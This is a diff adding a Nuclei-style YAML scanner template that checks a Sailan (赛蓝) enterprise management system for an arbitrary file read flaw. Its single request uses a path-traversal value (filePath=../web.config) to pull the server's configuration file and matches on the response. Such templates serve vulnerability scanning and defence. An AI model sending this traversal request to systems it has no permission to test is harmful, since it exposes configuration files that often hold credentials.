@@ -1,0 +1,24 @@
+id: poc-yaml-enterprise-management-system-getjsfile-anyfile-read
+info:
+  name: 赛蓝企业管理系统 GetJSFile 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Utility/GetJSFile?filePath=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "web.config"
+      - type: word
+        part: header
+        words:
+          - "text/javascript"
